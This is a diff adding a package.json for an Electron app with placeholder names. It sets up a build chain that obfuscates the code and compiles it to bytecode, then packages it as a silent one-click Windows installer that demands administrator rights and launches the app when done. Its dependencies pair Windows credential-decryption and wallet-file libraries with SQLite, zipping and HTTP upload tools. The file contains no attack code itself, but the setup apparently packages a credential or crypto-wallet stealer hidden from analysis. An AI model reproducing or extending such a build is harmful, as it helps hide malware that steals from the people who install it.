@@ -1,0 +1,107 @@
+{
+  "name": "abc",
+  "version": "1.0.0",
+  "description": "sdqwi",
+  "main": "dist-obf/index.js",
+  "scripts": {
+    "build:ts": "tsc",
+    "build:bundle": "node bundle.js",
+    "build:minify": "node minify.js",
+    "build:obfuscate": "node obf.js",
+    "build:bytecode": "npx electron bytecode.js",
+    "build:loader": "node loader.js",
+    "start": "node dist/index.js",
+    "dev": "ts-node src/index.ts",
+    "pumb": "ts-node src/pumb.ts",
+    "obfuscate": "javascript-obfuscator dist --output dist-obf --config obfuscator-config.json",
+    "package-electron": "npm run secure-build && electron-builder",
+    "electron": "electron-builder",
+    "secure-build": "npm run clean && npm run build:ts && npm run build:bundle && npm run build:minify && npm run build:obfuscate && npm run build:bytecode && npm run build:loader",
+    "clean": "rimraf dist build dist-obf"
+  },
+  "build": {
+    "compression": "maximum",
+    "appId": "com.abc.str",
+    "files": [
+      "dist-obf/app.protected.jsc",
+      "dist-obf/index.js",
+      "dist-obf/Themes/**/*",
+      "package.json",
+      "node_modules/**/*",
+      "!node_modules/@types",
+      "!node_modules/**/*.map",
+      "!node_modules/**/*.md",
+      "!**/node_modules/javascript-obfuscator",
+      "!**/node_modules/esbuild",
+      "!**/node_modules/typescript",
+      "!**/node_modules/node-gyp"
+    ],
+    "extraResources": [
+      {
+        "from": "src/themes/",
+        "to": "themes",
+        "filter": [
+          "**/*"
+        ]
+      }
+    ],
+    "directories": {
+      "output": "release"
+    },
+    "win": {
+      "target": "nsis",
+      "icon": "src/assets/temp_build_icon.ico",
+      "requestedExecutionLevel": "requireAdministrator"
+    },
+    "nsis": {
+      "oneClick": true,
+      "allowToChangeInstallationDirectory": false,
+      "perMachine": true,
+      "runAfterFinish": true,
+      "installerIcon": "src/assets/temp_build_icon.ico",
+      "uninstallerIcon": "src/assets/temp_build_icon.ico",
+      "include": "extra/installer.nsh"
+    },
+    "asar": true,
+    "asarUnpack": [
+      "**/node_modules/datavault-win/**/*",
+      "**/node_modules/sqlite3/**/*",
+      "**/node_modules/koffi/**/*",
+      "**/*.node"
+    ]
+  },
+  "dependencies": {
+    "adm-zip": "^0.5.10",
+    "app-builder-lib": "^26.8.1",
+    "axios": "^0.27.2",
+    "bytenode": "^1.5.7",
+    "datavault-win": "^1.0.0",
+    "esbuild": "^0.27.3",
+    "form-data": "^4.0.0",
+    "fs-extra": "^11.2.0",
+    "javascript-obfuscator": "^5.1.0",
+    "koffi": "^2.15.0",
+    "os": "^0.1.2",
+    "seco-file": "^1.0.0",
+    "sqlite3": "^5.1.6",
+    "terser": "^5.46.0",
+    "ws": "^8.14.2"
+  },
+  "devDependencies": {
+    "@types/adm-zip": "^0.5.5",
+    "@types/better-sqlite3": "^7.6.8",
+    "@types/fs-extra": "^11.0.4",
+    "@types/node": "^20.10.0",
+    "@types/ws": "^8.5.10",
+    "@types/yargs": "^17.0.35",
+    "electron": "^40.0.0",
+    "electron-builder": "^26.4.0",
+    "node-gyp": "^10.0.0",
+    "pkg": "^5.8.1",
+    "rcedit": "^5.0.2",
+    "ts-node": "^10.9.2",
+    "typescript": "^5.3.2"
+  },
+  "author": "beeee",
+  "productName": "bombastico"
+}
